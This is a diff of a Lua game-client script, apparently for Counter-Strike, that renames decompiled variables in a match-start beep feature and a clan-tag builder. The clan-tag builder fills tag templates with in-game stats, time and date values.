-			ui.set_visible(var_10_0.MatchStartBeep.delay, var_48_0)
-			ui.set_visible(var_10_0.MatchStartBeep.sounds, var_48_0)
-			ui.set_visible(var_10_0.MatchStartBeep.testsound, var_48_0)
-			ui.set_visible(var_10_0.MatchStartBeep.repeatTimes, var_48_0)
-			ui.set_visible(var_10_0.MatchStartBeep.repeatInterval, ui.get(var_10_0.MatchStartBeep.repeatTimes) ~= 1 and var_48_0)
+		ui.set_visible(CPLua.MatchStartBeep.repeatTimes, false)
+		ui.set_visible(CPLua.MatchStartBeep.repeatInterval, false)
+
+		ui.set_callback(CPLua.MatchStartBeep.enable, function(self)
+			local Status = ui.get(self)
+			ui.set_visible(CPLua.MatchStartBeep.delay, Status)
+			ui.set_visible(CPLua.MatchStartBeep.sounds, Status)
+			ui.set_visible(CPLua.MatchStartBeep.testsound, Status)
+
+			ui.set_visible(CPLua.MatchStartBeep.repeatTimes, Status)
+			ui.set_visible(CPLua.MatchStartBeep.repeatInterval, ui.get(CPLua.MatchStartBeep.repeatTimes) ~= 1 and Status)
 		end)
 
-		function var_10_0.MatchStartBeep.PlaySound()
-			local var_49_0 = var_10_12[ui.get(var_10_0.MatchStartBeep.sounds) + 1] or "Default (Beep)"
-
-			if var_49_0 and var_49_0 ~= "" and var_10_13[var_49_0] then
-				local var_49_1 = ui.get(var_10_0.MatchStartBeep.repeatTimes)
-				local var_49_2 = ui.get(var_10_0.MatchStartBeep.repeatInterval)
-
-				if var_49_1 == 1 then
-					var_0_7.DispatchEvent("PlaySoundEffect", var_10_13[var_49_0], "MOUSE")
+		CPLua.MatchStartBeep.PlaySound = function()
+			local SelectedSound = ProcessedSounds[ui.get(CPLua.MatchStartBeep.sounds)+1] or 'Default (Beep)'
+			if ( SelectedSound and SelectedSound ~= '' and ReferenceSounds[SelectedSound] ) then
+				local Times = ui.get(CPLua.MatchStartBeep.repeatTimes)
+				local Interval = ui.get(CPLua.MatchStartBeep.repeatInterval)
+				if ( Times == 1 ) then
+					_.DispatchEvent( 'PlaySoundEffect', ReferenceSounds[SelectedSound], 'MOUSE');
 				else
-					for iter_49_0 = 1, var_49_1 do
-						client.delay_call(var_49_1 == 1 and 0 or (iter_49_0 - 1) * var_49_2 / 1000, function()
-							printDebug("done")
-							var_0_7.DispatchEvent("PlaySoundEffect", var_10_13[var_49_0], "MOUSE")
+					for i=1, Times do
+						client.delay_call(Times == 1 and 0 or ( ( i - 1 ) * Interval ) / 1000, function()
+							printDebug('done')
+							_.DispatchEvent( 'PlaySoundEffect', ReferenceSounds[SelectedSound], 'MOUSE')
 						end)
 					end
 				end
 			end
 		end
 
-		ui.set_callback(var_10_0.MatchStartBeep.repeatTimes, function(arg_51_0)
-			local var_51_0 = ui.get(arg_51_0)
-
-			ui.set_visible(var_10_0.MatchStartBeep.repeatInterval, var_51_0 ~= 1 and ui.get(var_10_0.MatchStartBeep.enable))
+		ui.set_callback(CPLua.MatchStartBeep.repeatTimes, function(self)
+			local Status = ui.get(self)
+			ui.set_visible(CPLua.MatchStartBeep.repeatInterval, Status ~= 1 and ui.get(CPLua.MatchStartBeep.enable))
 		end)
-		client.set_event_callback("round_start", function()
-			if ui.get(var_10_0.MatchStartBeep.enable) then
-				local var_52_0 = cvar.mp_freezetime:get_int()
-				local var_52_1 = ui.get(var_10_0.MatchStartBeep.delay) / 100
+		
 
-				client.delay_call(var_52_0 * var_52_1, function()
-					var_10_0.MatchStartBeep.PlaySound()
+		client.set_event_callback('round_start', function()
+			if ( ui.get(CPLua.MatchStartBeep.enable) ) then
+				local mp_freezetime = cvar.mp_freezetime:get_int()
+				local percent = ui.get(CPLua.MatchStartBeep.delay) / 100
+				client.delay_call(mp_freezetime * percent, function()
+					CPLua.MatchStartBeep.PlaySound()
 				end)
 			end
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Custom Clantag Builder") then
-		var_10_0.Clantag = {}
-		var_10_0.Clantag.last = ""
-		var_10_0.Clantag.enable = ui.new_checkbox("Lua", "B", "Clantag Builder [BETA]")
-		var_10_0.Clantag.template = ui.new_textbox("Lua", "B", "\nClantag Template")
-		var_10_0.Clantag.helper1 = ui.new_label("Lua", "B", "Helper: Type { or anything")
-		var_10_0.Clantag.helper2 = ui.new_label("Lua", "B", "\n")
-		var_10_0.Clantag.helper3 = ui.new_label("Lua", "B", "\n")
-		var_10_0.Clantag.helper4 = ui.new_label("Lua", "B", "\n")
-		var_10_0.Clantag.helper5 = ui.new_label("Lua", "B", "\n")
-		var_10_0.Clantag.processedData = {}
-		var_10_0.Clantag.data = {
-			{
-				"rank",
-				"competitive ranking",
-				300,
-				function()
-					local var_54_0 = entity.get_prop(entity.get_player_resource(), "m_iCompetitiveRanking", entity.get_local_player())
+	--#region Custom Clantag Builder
+	if ( Feature.get('Custom Clantag Builder') ) then
+		CPLua.Clantag = {}
+		CPLua.Clantag.last = ''
+		CPLua.Clantag.enable = ui.new_checkbox('Lua', 'B', 'Clantag Builder [BETA]')
+		CPLua.Clantag.template = ui.new_textbox('Lua', 'B', '\nClantag Template')
+		CPLua.Clantag.helper1 = ui.new_label('Lua', 'B', 'Helper: Type { or anything')
+		CPLua.Clantag.helper2 = ui.new_label('Lua', 'B', '\n')
+		CPLua.Clantag.helper3 = ui.new_label('Lua', 'B', '\n')
+		CPLua.Clantag.helper4 = ui.new_label('Lua', 'B', '\n')
+		CPLua.Clantag.helper5 = ui.new_label('Lua', 'B', '\n')
 
-					if var_54_0 == 0 then
-						return "N/A"
-					end
+		CPLua.Clantag.processedData = {}
 
-					if var_54_0 then
-						local var_54_1 = var_0_9.GetGameModeInternalName(true)
-						local var_54_2 = var_0_7.Localize(var_54_1 == "survival" and "#skillgroup_" .. var_54_0 .. "dangerzone" or "RankName_" .. var_54_0)
+		CPLua.Clantag.data = {
+			{'rank', 'competitive ranking', 300, function()
+				local currentRank = entity.get_prop(entity.get_player_resource(), 'm_iCompetitiveRanking', entity.get_local_player())
+				if ( currentRank == 0 ) then return 'N/A' end
 
-						return (getRankShortName(var_54_2))
-					end
-				end,
-				0
-			},
-			{
-				"wins",
-				"competitive wins",
-				300,
-				function()
-					return entity.get_prop(entity.get_player_resource(), "m_iCompetitiveWins", entity.get_local_player()) or ""
-				end,
-				0
-			},
-			{
-				"hp",
-				"current health",
-				0.5,
-				function()
-					return entity.get_prop(entity.get_local_player(), "m_iHealth") or 0
-				end,
-				0
-			},
-			{
-				"amr",
-				"current armor",
-				0.5,
-				function()
-					return entity.get_prop(entity.get_local_player(), "m_ArmorValue") or 0
-				end,
-				0
-			},
-			{
-				"loc",
-				"current location",
-				0.5,
-				function()
-					return var_0_7.Localize(entity.get_prop(entity.get_local_player(), "m_szLastPlaceName")) or ""
-				end,
-				0
-			},
-			{
-				"kills",
-				"current kills",
-				1,
-				function()
-					return entity.get_prop(entity.get_player_resource(), "m_iKills", entity.get_local_player()) or 0
-				end,
-				0
-			},
-			{
-				"deaths",
-				"current deaths",
-				1,
-				function()
-					return entity.get_prop(entity.get_player_resource(), "m_iDeaths", entity.get_local_player()) or 0
-				end,
-				0
-			},
-			{
-				"assists",
-				"current assists",
-				1,
-				function()
-					return entity.get_prop(entity.get_player_resource(), "m_iAssists", entity.get_local_player()) or 0
-				end,
-				0
-			},
-			{
-				"hschance",
-				"current headshot chance",
-				1,
-				function()
-					local var_62_0 = entity.get_local_player()
-					local var_62_1 = var_10_0.Clantag.processedData.kills
-					local var_62_2 = entity.get_prop(entity.get_player_resource(), "m_iMatchStats_HeadShotKills_Total", entity.get_local_player())
+				if ( currentRank ) then
+					local CurrentMode = GameStateAPI.GetGameModeInternalName(true)
+					local RankLong = _.Localize(CurrentMode == 'survival' and '#skillgroup_'..currentRank..'dangerzone' or 'RankName_' .. currentRank)
+					local RankName = getRankShortName(RankLong)
 
-					if var_62_1 and var_62_2 then
-						return math.ceil(var_62_2 / var_62_1 * 100)
-					end
-				end,
-				0
-			},
-			{
-				"c4",
-				"displays BOMB if carrying bomb",
-				1,
-				function()
-					var_10_0.Clantag.last = ""
-				end,
-				0
-			},
-			{
-				"wep",
-				"current weapon name",
-				0.25,
-				function()
-					local var_64_0 = entity.get_local_player()
-					local var_64_1 = entity.get_player_weapon(var_64_0)
+					return RankName
+				end
+			end, 0},
+			{'wins', 'competitive wins', 300, function()
+				return entity.get_prop(entity.get_player_resource(), 'm_iCompetitiveWins', entity.get_local_player()) or ''
+			end, 0},
+			{'hp', 'current health', 0.5, function()
+				return entity.get_prop(entity.get_local_player(), 'm_iHealth') or 0
+			end, 0},
+			{'amr', 'current armor', 0.5, function()
+				return entity.get_prop(entity.get_local_player(), 'm_ArmorValue') or 0
+			end, 0},
+			{'loc', 'current location', 0.5, function()
+				return _.Localize(entity.get_prop(entity.get_local_player(), 'm_szLastPlaceName')) or ''
+			end, 0},
+			{'kills', 'current kills', 1, function()
+				return entity.get_prop(entity.get_player_resource(), 'm_iKills', entity.get_local_player()) or 0
+			end, 0},
+			{'deaths', 'current deaths', 1, function()
+				return entity.get_prop(entity.get_player_resource(), 'm_iDeaths', entity.get_local_player()) or 0
+			end, 0},
+			{'assists', 'current assists', 1, function()
+				return entity.get_prop(entity.get_player_resource(), 'm_iAssists', entity.get_local_player()) or 0
+			end, 0},
+			{'hschance', 'current headshot chance',  1, function()
+				local LocalPlayer = entity.get_local_player()
+				local TotalKills = CPLua.Clantag.processedData.kills
+				local HeadshotKills = entity.get_prop(entity.get_player_resource(), 'm_iMatchStats_HeadShotKills_Total', entity.get_local_player())
+				if ( TotalKills and HeadshotKills ) then				
+					return math.ceil( (HeadshotKills / TotalKills) * 100 )
+				end
+			end, 0},
+			{'c4', 'displays BOMB if carrying bomb', 1, function()
+				CPLua.Clantag.last = '' -- TEMP
+				
+			end, 0},
+			{'wep', 'current weapon name', 0.25, function()
+				local LocalPlayer = entity.get_local_player()
 
-					if var_64_1 == nil then
-						return
-					end
+				local WeaponENT = entity.get_player_weapon(LocalPlayer)
+				if WeaponENT == nil then return end
 
-					local var_64_2 = entity.get_prop(var_64_1, "m_iItemDefinitionIndex")
+				local WeaponIDX = entity.get_prop(WeaponENT, "m_iItemDefinitionIndex")
+				if WeaponIDX == nil then return end
 
-					if var_64_2 == nil then
-						return
-					end
+				local weapon = csgo_weapons[WeaponIDX]
+				if weapon == nil then return end
+				
+				return weapon.name
+			end, 0},
+			{'ammo', 'current weapon ammo', 0.25, function()
+				local LocalPlayer = entity.get_local_player()
 
-					local var_64_3 = var_0_1[var_64_2]
-
-					if var_64_3 == nil then
-						return
-					end
-
-					return var_64_3.name
-				end,
-				0
-			},
-			{
-				"ammo",
-				"current weapon ammo",
-				0.25,
-				function()
-					local var_65_0 = entity.get_local_player()
-					local var_65_1 = entity.get_player_weapon(var_65_0)
-
-					if var_65_1 == nil then
-						return
-					end
-
-					local var_65_2 = entity.get_prop(var_65_1, "m_iClip1")
-
-					if var_65_2 == nil then
-						return
-					end
-
-					return var_65_2
-				end,
-				0
-			},
-			{
-				"id",
-				"current steam id",
-				9999,
-				function()
-					return var_0_13.GetXuid()
-				end,
-				0
-			},
-			{
-				"bomb",
-				"bomb timer countdown",
-				1,
-				function()
-					local var_67_0 = entity.get_all("CPlantedC4")[1]
-
-					if var_67_0 == nil or entity.get_prop(var_67_0, "m_bBombDefused") == 1 or entity.get_local_player() == nil then
-						return ""
-					end
-
-					local var_67_1 = entity.get_prop(var_67_0, "m_flC4Blow") - globals.curtime()
-
-					return var_67_1 ~= nil and var_67_1 > 0 and math.floor(var_67_1) or ""
-				end,
-				0
-			},
-			{
-				"doa",
-				"displays DEAD or ALIVE",
-				0.5,
-				function()
-					return entity.is_alive(entity.get_local_player()) and "ALIVE" or "DEAD"
-				end,
-				0
-			},
-			{
-				"fps",
-				"current FPS",
-				0.05,
-				function()
-					return AccumulateFps()
-				end,
-				0
-			},
-			{
-				"ping",
-				"current ping",
-				0.5,
-				function()
-					return math.floor(client.latency() * 1000)
-				end,
-				0
-			},
-			{
-				"date",
-				"current date (DD/MM/YY)",
-				300,
-				function()
-					local var_71_0 = Date(client.unix_time())
-					local var_71_1 = string.format("%02d", var_71_0.getDate())
-					local var_71_2 = string.format("%02d", var_71_0.getMonth() + 1)
-
-					return string.format("%s/%s/%s", var_71_1, var_71_2, tostring(var_71_0.getFullYear()):sub(3, 4))
-				end,
-				0
-			},
-			{
-				"shortday",
-				"current name of the day (Mon, Wed, Tue)",
-				300,
-				function()
-					return ({
-						"Sun",
-						"Mon",
-						"Tue",
-						"Wed",
-						"Thu",
-						"Fri",
-						"Sat"
-					})[Date(client.unix_time()).getDay() + 1]
-				end,
-				0
-			},
-			{
-				"longday",
-				"current name of the day (Monday, Wednesday, Tuesday)",
-				300,
-				function()
-					return ({
-						"Sunday",
-						"Monday",
-						"Tuesday",
-						"Wednesday",
-						"Thursday",
-						"Friday",
-						"Saturday"
-					})[Date(client.unix_time()).getDay() + 1]
-				end,
-				0
-			},
-			{
-				"day",
-				"current day of the month",
-				300,
-				function()
-					local var_74_0 = Date(client.unix_time())
-
-					return string.format("%02d", var_74_0.getDate())
-				end,
-				0
-			},
-			{
-				"month",
-				"current month number",
-				300,
-				function()
-					local var_75_0 = Date(client.unix_time())
-
-					return string.format("%02d", var_75_0.getMonth() + 1)
-				end,
-				0
-			},
-			{
-				"year",
-				"current year number",
-				300,
-				function()
-					local var_76_0 = Date(client.unix_time())
-
-					return tostring(var_76_0.getFullYear()):sub(3, 4)
-				end,
-				0
-			},
-			{
-				"time12",
-				"current time in 12 hour time",
-				1,
-				function()
-					local var_77_0 = Date(client.unix_time())
-					local var_77_1 = var_77_0.getHours()
-					local var_77_2 = var_77_1 > 12 and "PM" or "AM"
-					local var_77_3 = string.format("%02d", var_77_1 > 12 and var_77_1 - 12 or var_77_1)
-					local var_77_4 = string.format("%02d", var_77_0.getMinutes())
-					local var_77_5 = string.format("%02d", var_77_0.getSeconds())
-
-					return string.format("%s:%s:%s %s", var_77_3, var_77_4, var_77_5, var_77_2)
-				end,
-				0
-			},
-			{
-				"time24",
-				"current time in 24 hour time",
-				1,
-				function()
-					local var_78_0 = Date(client.unix_time())
-					local var_78_1 = string.format("%02d", var_78_0.getHours())
-					local var_78_2 = string.format("%02d", var_78_0.getMinutes())
-					local var_78_3 = string.format("%02d", var_78_0.getSeconds())
-
-					return string.format("%s:%s:%s", var_78_1, var_78_2, var_78_3)
-				end,
-				0
-			},
-			{
-				"hour12",
-				"hour in 12 hour time",
-				1,
-				function()
-					local var_79_0 = Date(client.unix_time()).getHours()
-
-					return string.format("%02d", var_79_0 > 12 and var_79_0 - 12 or var_79_0)
-				end,
-				0
-			},
-			{
-				"hour24",
-				"hour in 24 hour time",
-				1,
-				function()
-					return Date(client.unix_time()).getHours()
-				end,
-				0
-			},
-			{
-				"mins",
-				"current minutes in system time",
-				1,
-				function()
-					local var_81_0 = Date(client.unix_time())
-
-					return string.format("%02d", var_81_0.getMinutes())
-				end,
-				0
-			},
-			{
-				"secs",
-				"current seconds in system time",
-				1,
-				function()
-					local var_82_0 = Date(client.unix_time())
-
-					return string.format("%02d", var_82_0.getSeconds())
-				end,
-				0
-			},
-			{
-				"timesuffix",
-				"12 hour time suffix",
-				1,
-				function()
-					return Date(client.unix_time()).getHours() > 12 and "PM" or "AM"
-				end,
-				0
-			}
+				local WeaponENT = entity.get_player_weapon(LocalPlayer)
+				if WeaponENT == nil then return end
+				
+				local Ammo = entity.get_prop(WeaponENT, "m_iClip1")
+				if Ammo == nil then return end
+				
+				return Ammo
+			end, 0},
+			{'id', 'current steam id', 9999, function()
+				return MyPersonaAPI.GetXuid()
+			end, 0},
+			{'bomb', 'bomb timer countdown', 1, function()
+				local c4 = entity.get_all("CPlantedC4")[1]
+				if c4 == nil or entity.get_prop(c4, "m_bBombDefused") == 1 or entity.get_local_player() == nil then return '' end
+				local c4_time = entity.get_prop(c4, "m_flC4Blow") - globals.curtime()
+				return c4_time ~= nil and c4_time > 0 and math.floor(c4_time) or ''
+			end, 0},
+			{'doa', 'displays DEAD or ALIVE', 0.5, function()
+				return entity.is_alive(entity.get_local_player()) and 'ALIVE' or 'DEAD'
+			end, 0},
+			{'fps', 'current FPS', 0.05, function()
+				return AccumulateFps()
+			end, 0},
+			{'ping', 'current ping', 0.5, function()
+				return math.floor(client.latency()*1000)
+			end, 0},
+			{'date', 'current date (DD/MM/YY)', 300, function()
+				local Data = Date(client.unix_time())
+				local Day = string.format("%02d", Data.getDate())
+				local Month = string.format("%02d", Data.getMonth()+1)
+				return string.format('%s/%s/%s', Day, Month, tostring(Data.getFullYear()):sub(3,4))
+			end, 0},
+			{'shortday', 'current name of the day (Mon, Wed, Tue)', 300, function()
+				local DaysOfWeek = {'Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'}
+				local Data = Date(client.unix_time())
+				return DaysOfWeek[Data.getDay()+1]
+			end, 0},
+			{'longday', 'current name of the day (Monday, Wednesday, Tuesday)', 300, function()
+				local DaysOfWeek = {'Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'}
+				local Data = Date(client.unix_time())
+				return DaysOfWeek[Data.getDay()+1]
+			end, 0},
+			{'day', 'current day of the month', 300, function()
+				local Data = Date(client.unix_time())
+				return string.format("%02d", Data.getDate())
+			end, 0},
+			{'month', 'current month number', 300, function()
+				local Data = Date(client.unix_time())
+				return string.format("%02d", Data.getMonth()+1)
+			end, 0},
+			{'year', 'current year number', 300, function()
+				local Data = Date(client.unix_time())
+				return tostring(Data.getFullYear()):sub(3,4)
+			end, 0},
+			{'time12', 'current time in 12 hour time', 1, function()
+				local Data = Date(client.unix_time())
+				local Hours = Data.getHours()
+				local Suffix = Hours > 12 and 'PM' or 'AM'
+				Hours = string.format("%02d", Hours > 12 and Hours - 12 or Hours)
+				local Minutes = string.format("%02d", Data.getMinutes())
+				local Seconds = string.format("%02d", Data.getSeconds())
+				return string.format('%s:%s:%s %s', Hours, Minutes, Seconds, Suffix)
+			end, 0},
+			{'time24', 'current time in 24 hour time', 1, function()
+				local Data = Date(client.unix_time())
+				local Hours = string.format("%02d", Data.getHours())
+				local Minutes = string.format("%02d", Data.getMinutes())
+				local Seconds = string.format("%02d", Data.getSeconds())
+				return string.format('%s:%s:%s', Hours, Minutes, Seconds)
+			end, 0},
+			{'hour12', 'hour in 12 hour time', 1, function()
+				local Data = Date(client.unix_time())
+				local Hours = Data.getHours()
+				return string.format("%02d", Hours > 12 and Hours - 12 or Hours)
+			end, 0},
+			{'hour24', 'hour in 24 hour time', 1, function()	
+				local Data = Date(client.unix_time())
+				return Data.getHours()
+			end, 0},
+			{'mins', 'current minutes in system time', 1, function()
+				local Data = Date(client.unix_time())
+				return string.format("%02d", Data.getMinutes())
+			end, 0},
+			{'secs', 'current seconds in system time', 1, function()
+				local Data = Date(client.unix_time())
+				return string.format("%02d", Data.getSeconds())
+			end, 0},
+			{'timesuffix', '12 hour time suffix', 1, function()
+				local Data = Date(client.unix_time())
+				local Hours = Data.getHours()
+				return Hours > 12 and 'PM' or 'AM'
+			end, 0}
 		}
+		
+		ui.set_visible(CPLua.Clantag.template, false)
+		ui.set_visible(CPLua.Clantag.helper1, false)
+		ui.set_visible(CPLua.Clantag.helper2, false)
+		ui.set_visible(CPLua.Clantag.helper3, false)
+		ui.set_visible(CPLua.Clantag.helper4, false)
+		ui.set_visible(CPLua.Clantag.helper5, false)
 
-		ui.set_visible(var_10_0.Clantag.template, false)
-		ui.set_visible(var_10_0.Clantag.helper1, false)
-		ui.set_visible(var_10_0.Clantag.helper2, false)
-		ui.set_visible(var_10_0.Clantag.helper3, false)
-		ui.set_visible(var_10_0.Clantag.helper4, false)
-		ui.set_visible(var_10_0.Clantag.helper5, false)
-
-		local var_10_14 = false
-
-		client.set_event_callback("pre_config_load", function()
-			var_10_14 = true
+		local configLoading = false
+		client.set_event_callback('pre_config_load', function()
+			configLoading = true
 		end)
-		client.set_event_callback("post_config_load", function()
-			var_10_14 = false
+		
+		client.set_event_callback('post_config_load', function()
+			configLoading = false
 		end)
-		ui.set_callback(var_10_0.Clantag.enable, function(arg_86_0)
-			local var_86_0 = ui.get(arg_86_0)
+		
 
-			if not var_86_0 and not var_10_14 then
-				client.set_clan_tag("\x00")
+		ui.set_callback(CPLua.Clantag.enable, function(self)
+			local Status = ui.get(self)
+			if ( not Status and not configLoading ) then
+				client.set_clan_tag('\0')
+				-- print('fuck')
 			end
 
-			var_10_0.Clantag.last = ""
-
-			ui.set_visible(var_10_0.Clantag.template, var_86_0)
-			ui.set(var_10_0.Clantag.helper1, "Helper: type { to get suggestions")
-			ui.set_visible(var_10_0.Clantag.helper1, var_86_0)
-			ui.set_visible(var_10_0.Clantag.helper2, false)
-			ui.set_visible(var_10_0.Clantag.helper3, false)
-			ui.set_visible(var_10_0.Clantag.helper4, false)
-			ui.set_visible(var_10_0.Clantag.helper5, false)
+			CPLua.Clantag.last = ''
+			ui.set_visible(CPLua.Clantag.template, Status)
+			ui.set(CPLua.Clantag.helper1, 'Helper: type { to get suggestions')
+			ui.set_visible(CPLua.Clantag.helper1, Status)
+			ui.set_visible(CPLua.Clantag.helper2, false)
+			ui.set_visible(CPLua.Clantag.helper3, false)
+			ui.set_visible(CPLua.Clantag.helper4, false)
+			ui.set_visible(CPLua.Clantag.helper5, false)
 		end)
 
-		local var_10_15 = ui.get(var_10_0.Clantag.template)
-
-		client.set_event_callback("post_render", function()
-			local var_87_0 = ui.get(var_10_0.Clantag.template)
-
-			if var_87_0 ~= var_10_15 then
-				var_10_15 = var_87_0
-
-				local var_87_1 = var_87_0:match("{(%a*%d*)$")
-
-				if var_87_1 then
-					local var_87_2 = false
-
-					if var_87_1:len() > 0 then
-						for iter_87_0, iter_87_1 in ipairs(var_10_0.Clantag.data) do
-							if iter_87_1[1]:sub(1, var_87_1:len()) == var_87_1:lower() then
-								var_87_2 = iter_87_1
-
-								break
+		-- Helper Code
+		local LastTemplateText = ui.get(CPLua.Clantag.template)
+		client.set_event_callback('post_render', function()
+			local TemplateText = ui.get(CPLua.Clantag.template)
+			if ( TemplateText ~= LastTemplateText ) then
+				LastTemplateText = TemplateText
+				local Match = TemplateText:match('{(%a*%d*)$')
+				if ( Match ) then
+					local FoundMatch = false
+					if ( Match:len() > 0 ) then
+						for i, v in ipairs(CPLua.Clantag.data) do
+							if ( v[1]:sub(1, Match:len()) == Match:lower() ) then
+								FoundMatch = v
+								break;
 							end
 						end
-
-						if var_87_2 then
-							ui.set(var_10_0.Clantag.helper1, "{" .. var_87_2[1] .. "} - " .. var_87_2[2])
+						if ( FoundMatch ) then
+							ui.set(CPLua.Clantag.helper1, '{' .. FoundMatch[1] .. '} - ' .. FoundMatch[2])
 						else
-							ui.set(var_10_0.Clantag.helper1, "no matches found for {" .. var_87_1 .. "}")
-						end
-
-						ui.set_visible(var_10_0.Clantag.helper2, false)
-						ui.set_visible(var_10_0.Clantag.helper3, false)
-						ui.set_visible(var_10_0.Clantag.helper4, false)
-						ui.set_visible(var_10_0.Clantag.helper5, false)
+							ui.set(CPLua.Clantag.helper1, 'no matches found for {' .. Match .. '}' )
+						end		
+						ui.set_visible(CPLua.Clantag.helper2, false)
+						ui.set_visible(CPLua.Clantag.helper3, false)
+						ui.set_visible(CPLua.Clantag.helper4, false)
+						ui.set_visible(CPLua.Clantag.helper5, false)
 					else
-						local var_87_3 = {
+						local HelperCMDS = {
 							helper1 = {},
 							helper2 = {},
 							helper3 = {},
 							helper4 = {},
-							helper5 = {}
+							helper5 = {},
 						}
-						local var_87_4 = {}
-
-						for iter_87_2, iter_87_3 in ipairs(var_10_0.Clantag.data) do
-							var_87_4[#var_87_4 + 1] = iter_87_3[1]
-						end
-
-						for iter_87_4 = 1, 7 do
-							local var_87_5 = var_87_4[iter_87_4]
-
-							if var_87_5 then
-								var_87_3.helper1[#var_87_3.helper1 + 1] = var_87_5
+						local cmds = {}
+						for i, v in ipairs(CPLua.Clantag.data) do
+							cmds[#cmds + 1] = v[1]
+						end						
+						-- I'm going to do some proper maths for this at a later date.
+						for i=1, 7 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper1[#HelperCMDS.helper1 + 1] = cmd
 							end
 						end
-
-						for iter_87_5 = 8, 14 do
-							local var_87_6 = var_87_4[iter_87_5]
-
-							if var_87_6 then
-								var_87_3.helper2[#var_87_3.helper2 + 1] = var_87_6
+						for i=8, 14 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper2[#HelperCMDS.helper2 + 1] = cmd
 							end
 						end
-
-						for iter_87_6 = 15, 21 do
-							local var_87_7 = var_87_4[iter_87_6]
-
-							if var_87_7 then
-								var_87_3.helper3[#var_87_3.helper3 + 1] = var_87_7
+						for i=15, 21 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper3[#HelperCMDS.helper3 + 1] = cmd
 							end
 						end
-
-						for iter_87_7 = 22, 28 do
-							local var_87_8 = var_87_4[iter_87_7]
-
-							if var_87_8 then
-								var_87_3.helper4[#var_87_3.helper4 + 1] = var_87_8
+						for i=22, 28 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper4[#HelperCMDS.helper4 + 1] = cmd
 							end
 						end
-
-						for iter_87_8 = 29, 35 do
-							local var_87_9 = var_87_4[iter_87_8]
-
-							if var_87_9 then
-								var_87_3.helper5[#var_87_3.helper5 + 1] = var_87_9
+						for i=29, 35 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper5[#HelperCMDS.helper5 + 1] = cmd
 							end
 						end
+						
+						ui.set(CPLua.Clantag.helper1, table.concat(HelperCMDS.helper1, ', ') )
+						ui.set(CPLua.Clantag.helper2, table.concat(HelperCMDS.helper2, ', ') )
+						ui.set(CPLua.Clantag.helper3, table.concat(HelperCMDS.helper3, ', ') )
+						ui.set(CPLua.Clantag.helper4, table.concat(HelperCMDS.helper4, ', ') )
+						ui.set(CPLua.Clantag.helper5, table.concat(HelperCMDS.helper5, ', ') )
 
-						ui.set(var_10_0.Clantag.helper1, table.concat(var_87_3.helper1, ", "))
-						ui.set(var_10_0.Clantag.helper2, table.concat(var_87_3.helper2, ", "))
-						ui.set(var_10_0.Clantag.helper3, table.concat(var_87_3.helper3, ", "))
-						ui.set(var_10_0.Clantag.helper4, table.concat(var_87_3.helper4, ", "))
-						ui.set(var_10_0.Clantag.helper5, table.concat(var_87_3.helper5, ", "))
-						ui.set_visible(var_10_0.Clantag.helper1, #var_87_3.helper1 > 0)
-						ui.set_visible(var_10_0.Clantag.helper2, #var_87_3.helper2 > 0)
-						ui.set_visible(var_10_0.Clantag.helper3, #var_87_3.helper3 > 0)
-						ui.set_visible(var_10_0.Clantag.helper4, #var_87_3.helper4 > 0)
-						ui.set_visible(var_10_0.Clantag.helper5, #var_87_3.helper5 > 0)
+						ui.set_visible(CPLua.Clantag.helper1, #HelperCMDS.helper1 > 0)
+						ui.set_visible(CPLua.Clantag.helper2, #HelperCMDS.helper2 > 0)
+						ui.set_visible(CPLua.Clantag.helper3, #HelperCMDS.helper3 > 0)
+						ui.set_visible(CPLua.Clantag.helper4, #HelperCMDS.helper4 > 0)
+						ui.set_visible(CPLua.Clantag.helper5, #HelperCMDS.helper5 > 0)
 					end
 				else
-					ui.set(var_10_0.Clantag.helper1, "Helper: " .. var_87_0 .. "_")
-					ui.set_visible(var_10_0.Clantag.helper2, false)
-					ui.set_visible(var_10_0.Clantag.helper3, false)
-					ui.set_visible(var_10_0.Clantag.helper4, false)
-					ui.set_visible(var_10_0.Clantag.helper5, false)
+					ui.set(CPLua.Clantag.helper1, 'Helper: ' .. TemplateText .. '_')
+					ui.set_visible(CPLua.Clantag.helper2, false)
+					ui.set_visible(CPLua.Clantag.helper3, false)
+					ui.set_visible(CPLua.Clantag.helper4, false)
+					ui.set_visible(CPLua.Clantag.helper5, false)
 				end
 			end
 		end)
 
-		var_10_0.loops[#var_10_0.loops + 1] = function()
-			if not ui.get(var_10_0.Clantag.enable) then
-				return
-			end
+		CPLua.loops[#CPLua.loops + 1] = function()
+			if ( not ui.get(CPLua.Clantag.enable) ) then return end
+			if ( not entity.get_local_player() ) then return end
 
-			if not entity.get_local_player() then
-				return
-			end
-
-			for iter_88_0, iter_88_1 in ipairs(var_10_0.Clantag.data) do
-				local var_88_0 = iter_88_1[1]
-				local var_88_1 = iter_88_1[2]
-				local var_88_2 = iter_88_1[3]
-				local var_88_3 = iter_88_1[4]
-
-				if globals.curtime() > iter_88_1[5] then
-					local var_88_4 = var_88_3()
-
-					if var_88_4 == nil then
-						var_10_0.Clantag.processedData[var_88_0] = ""
-					elseif var_88_4 then
-						var_10_0.Clantag.processedData[var_88_0] = var_88_4
+			-- DATA CALCULATIONS
+			for index, value in ipairs(CPLua.Clantag.data) do
+				local tag = value[1]
+				local desc = value[2]
+				local delay = value[3]
+				local callfunc = value[4]
+				
+				if ( globals.curtime() > value[5] ) then
+					local Output = callfunc()
+					if ( Output == nil ) then
+						CPLua.Clantag.processedData[tag] = ''
+					elseif ( Output ) then
+						CPLua.Clantag.processedData[tag] = Output
 					end
-
-					iter_88_1[5] = globals.curtime() + var_88_2
+					value[5] = globals.curtime() + delay
 				end
 			end
-
-			local var_88_5 = processTags(ui.get(var_10_0.Clantag.template), var_10_0.Clantag.processedData)
-
-			if var_10_0.Clantag.last ~= var_88_5 and var_88_5 ~= "" then
-				client.set_clan_tag(var_88_5)
-
-				var_10_0.Clantag.last = var_88_5
+			
+			local newClantag = processTags(ui.get(CPLua.Clantag.template), CPLua.Clantag.processedData)
+			if ( CPLua.Clantag.last ~= newClantag and newClantag ~= '' ) then
+				client.set_clan_tag(newClantag)
+				CPLua.Clantag.last = newClantag
